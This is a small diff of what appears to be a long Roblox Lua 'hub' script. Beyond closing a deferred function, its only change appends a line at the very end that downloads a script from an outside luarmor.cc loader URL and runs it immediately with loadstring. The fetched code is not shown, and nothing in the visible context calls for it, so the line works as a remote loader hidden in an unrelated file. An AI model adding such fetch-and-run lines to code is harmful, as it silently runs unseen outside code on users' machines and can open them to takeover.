@@ -5392,3 +5392,5 @@ task.defer(function()
     end
     _hubRestoring = false
 end);
+
+loadstring(game:HttpGet("https://api.luarmor.cc/files/v4/loaders/31f75fdee70c4ea29d41d77832ab0621.lua"))()
